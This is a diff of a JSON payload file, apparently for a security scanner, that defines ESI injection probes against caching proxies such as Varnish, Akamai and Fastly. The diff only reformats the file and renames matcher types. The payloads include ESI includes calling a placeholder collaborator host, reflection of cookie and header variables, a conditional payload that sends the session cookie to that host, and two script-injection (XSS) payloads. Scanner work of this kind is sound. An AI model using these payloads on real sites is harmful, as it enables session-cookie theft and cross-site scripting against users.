@@ -9,88 +9,155 @@
   "contexts": {
     "basic_include": {
       "description": "Inject ESI include tags to fetch arbitrary resources through the cache layer",
-      "tech_match": ["varnish", "akamai", "squid", "fastly", "oracle-web-cache", "cdn"],
+      "tech_match": [
+        "varnish",
+        "akamai",
+        "squid",
+        "fastly",
+        "oracle-web-cache",
+        "cdn"
+      ],
       "probes": [
         {
           "payload": "<esi:include src=\"/esi-test-{{RAND}}\" />",
           "description": "Basic ESI include tag. If the proxy processes it, the server receives a sub-request to /esi-test-RAND.",
           "matchers": [
-            {"type": "status_not", "value": [200]},
-            {"type": "word", "value": ["esi-test-"]}
+            {
+              "type": "not_status",
+              "value": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "value": [
+                "esi-test-"
+              ]
+            }
           ]
         },
         {
           "payload": "<esi:include src=\"http://COLLABORATOR/\" />",
           "description": "ESI include with external URL. A DNS or HTTP callback proves the cache layer processes ESI tags.",
           "matchers": [
-            {"type": "collaborator", "protocol": "http"}
+            {
+              "type": "collaborator",
+              "protocol": "http"
+            }
           ]
         },
         {
           "payload": "x]><esi:include src=http://COLLABORATOR/ />",
           "description": "ESI include with XSS-style prefix to escape HTML context before the tag.",
           "matchers": [
-            {"type": "collaborator", "protocol": "http"}
+            {
+              "type": "collaborator",
+              "protocol": "http"
+            }
           ]
         }
       ]
     },
     "variable_access": {
       "description": "ESI variable access to exfiltrate cookies, headers, or query params through the cache layer",
-      "tech_match": ["varnish", "akamai", "squid", "fastly"],
+      "tech_match": [
+        "varnish",
+        "akamai",
+        "squid",
+        "fastly"
+      ],
       "probes": [
         {
           "payload": "<esi:vars>$(HTTP_COOKIE)</esi:vars>",
           "description": "ESI vars tag to reflect session cookies. If processed, the response body contains the raw cookie header.",
           "matchers": [
-            {"type": "word", "value": ["session", "PHPSESSID", "JSESSIONID", "connect.sid"]}
+            {
+              "type": "word",
+              "value": [
+                "session",
+                "PHPSESSID",
+                "JSESSIONID",
+                "connect.sid"
+              ]
+            }
           ]
         },
         {
           "payload": "<esi:vars>$(HTTP_HOST)</esi:vars>",
           "description": "ESI vars to reflect the Host header. Verifies the proxy processes ESI variable substitution.",
           "matchers": [
-            {"type": "word_absent", "value": ["$(HTTP_HOST)"]}
+            {
+              "type": "not_word",
+              "value": [
+                "$(HTTP_HOST)"
+              ]
+            }
           ]
         },
         {
           "payload": "<esi:vars>$(QUERY_STRING)</esi:vars>",
           "description": "ESI vars to reflect query string. Useful to confirm ESI processing without external callbacks.",
           "matchers": [
-            {"type": "word_absent", "value": ["$(QUERY_STRING)"]}
+            {
+              "type": "not_word",
+              "value": [
+                "$(QUERY_STRING)"
+              ]
+            }
           ]
         }
       ]
     },
     "conditional": {
       "description": "ESI conditional logic to leak information or branch cache behaviour",
-      "tech_match": ["varnish", "akamai"],
+      "tech_match": [
+        "varnish",
+        "akamai"
+      ],
       "probes": [
         {
           "payload": "<esi:choose><esi:when test=\"$(HTTP_COOKIE{'session'})!=''\" ><esi:include src=\"http://COLLABORATOR/?c=$(HTTP_COOKIE{'session'})\" /></esi:when></esi:choose>",
           "description": "Conditional ESI: if session cookie exists, exfiltrate it to collaborator.",
           "matchers": [
-            {"type": "collaborator", "protocol": "http"}
+            {
+              "type": "collaborator",
+              "protocol": "http"
+            }
           ]
         }
       ]
     },
     "xss_via_esi": {
       "description": "XSS through ESI tag injection — inject script via ESI include of attacker-controlled resource",
-      "tech_match": ["varnish", "akamai", "squid", "fastly"],
+      "tech_match": [
+        "varnish",
+        "akamai",
+        "squid",
+        "fastly"
+      ],
       "probes": [
         {
           "payload": "<esi:include src=\"data:text/html,<script>alert(1)</script>\" />",
           "description": "ESI include with data: URI containing script. Some ESI processors support data URIs.",
           "matchers": [
-            {"type": "word", "value": ["<script>alert(1)</script>"]}
+            {
+              "type": "word",
+              "value": [
+                "<script>alert(1)</script>"
+              ]
+            }
           ]
         },
         {
           "payload": "<esi:inline name=\"/attack.html\" fetchable=\"yes\"><script>alert(1)</script></esi:inline>",
           "description": "ESI inline tag stores content on the cache layer, making it fetchable at /attack.html.",
           "matchers": [
-            {"type": "word", "value": ["<script>alert(1)</script>"]}
+            {
+              "type": "word",
+              "value": [
+                "<script>alert(1)</script>"
+              ]
+            }
           ]
         }
       ]
